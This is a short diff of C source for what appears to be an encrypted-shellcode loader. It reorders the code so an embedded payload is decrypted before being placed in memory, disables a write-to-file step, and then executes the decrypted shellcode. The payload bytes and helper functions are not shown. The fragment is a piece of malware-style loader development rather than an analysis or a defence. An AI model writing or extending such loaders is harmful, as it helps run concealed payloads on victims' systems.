@@ -296,14 +296,14 @@ void write_to_file(void) {
 int main(void) {   
     init_kernel_library();
     print_minimal();
+    decrypt_data(shellcode_to_execute, sizeof(shellcode_to_execute));
+    print_minimal();
     void *placed_shellcode = shellcode_handling_load(shellcode_to_execute, sizeof(shellcode_to_execute));
     if(placed_shellcode == NULL){
 	return -1;
     }
     print_minimal();
-    decrypt_data(shellcode_to_execute, sizeof(shellcode_to_execute));
-    print_minimal();
-    write_to_file();
+    //write_to_file();
     print_minimal();
     shellcode_handling_execute(placed_shellcode + iv_length);
     return 0;
